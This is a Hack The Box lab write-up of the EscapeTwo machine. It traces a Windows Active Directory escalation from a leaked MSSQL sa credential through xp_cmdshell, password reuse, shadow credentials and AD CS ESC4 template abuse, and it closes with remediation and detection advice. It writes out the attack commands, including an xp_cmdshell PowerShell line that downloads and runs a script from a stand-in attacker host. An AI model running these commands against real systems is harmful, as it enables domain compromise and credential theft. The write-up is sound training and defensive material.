---
title: "EscapeTwo — AD CS ESC4 Template Abuse via WriteOwner and Shadow Credentials"
description: "A share readable by a low-privileged domain account exposes a live MSSQL sa credential, enabling command execution and configuration-file password reuse before AD CS ESC4 template abuse issues a certificate for the administrative identity."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-15"
tags:
  - windows
  - active-directory
  - ad-cs
  - mssql
  - credential-reuse
objective: "Escalate from a low-privileged domain account to domain administrative access through credential discovery, MSSQL command execution, and AD CS template-permission abuse."
tools:
  - NetExec
  - smbget
  - Impacket
  - Certipy
  - evil-winrm
skill: "Active Directory escalation through credential reuse, MSSQL command execution, and AD CS certificate-template abuse"
outcome: "Administrative certificate authentication through an ESC4-abused template, reached after shadow-credential recovery of the CA service account hash and configuration-file password reuse."
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Server Active Directory domain controller for `<DOMAIN>` hosting MSSQL |
| Starting position | Low-privileged domain account (`<LAB_USER>`) with network access |
| Objective | Escalate from a low-privileged domain account to domain administrative access through credential discovery, MSSQL command execution, and AD CS template-permission abuse |
| Outcome | Administrative certificate authentication through an ESC4-abused template |

## From a readable share to a domain certificate

EscapeTwo is a Medium-rated Hack The Box Windows Active Directory lab. Starting from a low-privileged domain account, a spreadsheet on an Accounting share exposes a live MSSQL `sa` credential; that credential enables `xp_cmdshell` command execution, the SQL Server installation configuration file discloses the service-account password, and the same secret authenticates a second domain account. From there, ownership of the certificate-authority service account enables a shadow-credentials attack, and write access to a certificate template (ESC4) produces a certificate for the administrative identity. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Low-privileged share access → `accounts.xlsx` MSSQL `sa` credential → `xp_cmdshell` command execution as `<SQL_SVC>` → SQL configuration-file password → domain user credential reuse → `WriteOwner` and shadow credentials over `<CA_SVC>` → AD CS ESC4 template abuse → administrative certificate authentication**

## Target surfaces and starting account

- **Target:** a Windows Server Active Directory domain controller for `<DOMAIN>` that hosts an MSSQL instance and serves file shares.
- **Exposed surfaces used:** an SMB file share, the MSSQL service, WinRM for remote management, and an Active Directory Certificate Services enterprise CA.
- **Starting position:** a low-privileged domain account (`<LAB_USER>`) with network access.
- **Objective:** move from that account to domain administrative access by chaining credential discovery, database command execution, credential reuse, and certificate-template abuse.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: share access to template abuse

### 1. SMB Share Enumeration and Spreadsheet Credential Discovery

Observation: the low-privileged domain account can read an Accounting share, and its contents include a business spreadsheet.

Action: list shares, then download the readable share recursively.

```bash
nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>' --shares
```

Share listing:

```text
Accounting Department: READ
```

```bash
smbget --user='<LAB_USER>%<LAB_USER_PASSWORD>' 'smb://<TARGET_IP>/Accounting Department' --recursive
```

The downloaded spreadsheet `accounts.xlsx` contains MSSQL database-administrator credentials:

```text
sa:<SA_PASSWORD>
```

Significance: a share readable by an ordinary domain account placed a live database-administrator credential in an accessible business file, so no exploit was needed to reach the database service.

Result: an MSSQL `sa` credential is recovered and is subsequently validated through MSSQL in the next stage.

### 2. MSSQL Command Execution

Observation: the recovered `sa` credential authenticates to the exposed MSSQL service, where `xp_cmdshell` can be enabled through the Impacket client.

Action: connect as `sa` and enable and invoke OS command execution.

```bash
impacket-mssqlclient <DOMAIN>/sa:'<SA_PASSWORD>'@<TARGET_IP> -windows-auth
```

```sql
enable_xp_cmdshell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_HOST>/<STAGED_SCRIPT>'')"'
```

Significance: `xp_cmdshell` executes operating-system commands in the context of the SQL Server service account, so database access becomes command execution on the host without any software vulnerability.

Result: command execution is obtained in the `<SQL_SVC>` context.

### 3. SQL Server Configuration File Credential Recovery

Observation: the SQL Server installation directory retains a configuration file that records the service account password.

Action: read the installation configuration file.

```powershell
type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```

```text
SQLSVCPASSWORD="<SQL_SVC_PASSWORD>"
```

Significance: a configuration file supplied with `/SQLSVCPASSWORD=...` remained readable after installation, so the service-account secret was still on disk.

Result: the service-account password is recovered from the configuration file.

### 4. Password Reuse and Domain User Discovery

Observation: the recovered service-account password may also be valid for domain accounts.

Action: I tried the recovered password across candidate usernames.

```bash
nxc smb <TARGET_IP> -u users.txt -p '<SQL_SVC_PASSWORD>' --continue-on-success
```

```text
[+] <DOMAIN>\<AD_USER>:<SQL_SVC_PASSWORD>
```

Significance: the same secret authenticates a second account, evidence of password reuse between the SQL service account and a domain user, which widens the set of identities the recovered credential unlocks.

Result: a domain credential for `<AD_USER>` is recovered and validated through SMB.

### 5. AD CS ESC4 Certificate-Template Abuse

Observation: `<AD_USER>` holds `WriteOwner` over the certificate-authority service account `<CA_SVC>`; exercising that ownership through a shadow-credentials attack recovers `<CA_SVC>`'s NTLM hash, and the `DunderMifflinAuthentication` template can then be modified through ESC4.

Action: request a certificate for the administrative identity using the recovered service-account hash and the writable template, then authenticate and open a remote session.

```bash
certipy req -u '<CA_SVC>@<DOMAIN>' -hashes :<CA_SVC_HASH> \
  -template 'DunderMifflinAuthentication' \
  -upn '<ADMIN_ACCOUNT>@<DOMAIN>' \
  -ca '<CA_NAME>'
```

```bash
certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
evil-winrm -i <TARGET_IP> -u <ADMIN_ACCOUNT> -H <ADMIN_NT_HASH>
```

Significance: write access to a certificate template lets a requester weaken the template's constraints and ask the CA to issue a certificate naming a privileged account. Here the CA service account was reached by taking ownership of its object, so control of a template translated into credentials for an identity the requester does not control. This abuses legitimate AD CS permissions; no software vulnerability is involved.

Result: certificate authentication yields administrative access to the domain.

## Challenges and Decisions

The source documents no failed attempts, dead ends, or explicit tradeoffs for this path; each step advanced with a recovered credential or a configuration finding.

## Outcome: administrative certificate authentication

The path runs from a low-privileged domain account to administrative certificate authentication. The escalation abused legitimate AD CS permissions; no software vulnerability was involved.

Terminal output was not retained for the MSSQL command-execution shell, the template-owner and shadow-credential acquisition, or the certificate-based authentication, so those transitions are reported as recorded and are not reproduced from evidence.

## Recommendations: share hygiene, xp_cmdshell, config files, reuse, and ESC4

Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The proposed controls were not tested during this exercise.

1. **Credential-bearing file on a share readable by a low-privileged account.** A spreadsheet exposed a live MSSQL `sa` credential. *Recommendation:* restrict share membership, keep administrative secrets out of ordinary business files, and use service-specific database logins instead of `sa`. *Detection:* monitor access to database or finance exports and on `sa` logins from workstations.
2. **Enablement of `xp_cmdshell`.** Database access became operating-system command execution under `<SQL_SVC>`. *Recommendation:* disable `xp_cmdshell` (`sp_configure 'xp_cmdshell', 0`) unless a documented need exists, and grant SQL logins the minimum privilege. *Detection:* monitor `sp_configure` changes and `xp_cmdshell` invocations that spawn shell or download processes.
3. **Service-account password retained in the SQL Server install configuration.** The setup file still held `SQLSVCPASSWORD`. *Recommendation:* delete or restrict the installation configuration file after setup and rotate any credential it contains. *Detection:* scan install directories and backups for credential-bearing configuration files.
4. **Password reuse between the SQL service account and a domain user.** One secret authenticated two accounts. *Recommendation:* issue unique, rotated credentials per account and service. *Detection:* alert when a service-account credential authenticates a different identity or from an unexpected host.
5. **Write access to an AD CS certificate template (ESC4).** Control of the CA service account identity enabled modification of the `DunderMifflinAuthentication` template (ESC4), which was then used to request a certificate for the administrative identity. *Recommendation:* audit certificate templates and CA-object ownership, and remove unnecessary `WriteOwner`/write permissions so enrollment is the only action ordinary accounts can take. *Validation:* periodically enumerate template and CA permissions with a tool such as Certipy or PSPKIAudit and review the findings.

## References

- [Hack The Box — EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo) (retired machine)
- [Certificate template concepts (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts) (template enrollment, subject name, and client-authentication settings)
- [Manage certificate templates (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage-certificate-templates) (template enrollment permissions and access control)
- [\[MS-ADTS\]: msDS-KeyCredentialLink (Microsoft Learn)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) (key-credential attribute abused by shadow-credentials attacks)
- [xp_cmdshell (Transact-SQL) (Microsoft Learn)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) (extended stored procedure for OS command execution)
- [Install SQL Server Using a Configuration File (Microsoft Learn)](https://learn.microsoft.com/en-us/sql/database-engine/install-windows/install-sql-server-using-a-configuration-file) (setup configuration files and stored service-account settings)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB share enumeration and credential spray checks)
- [smbget — Samba manual page](https://www.samba.org/samba/docs/current/man-html/smbget.1.html) (recursive SMB share download)
- [Impacket](https://github.com/fortra/impacket) (MSSQL client and `xp_cmdshell` helper)
- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and certificate abuse)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell with hash authentication)
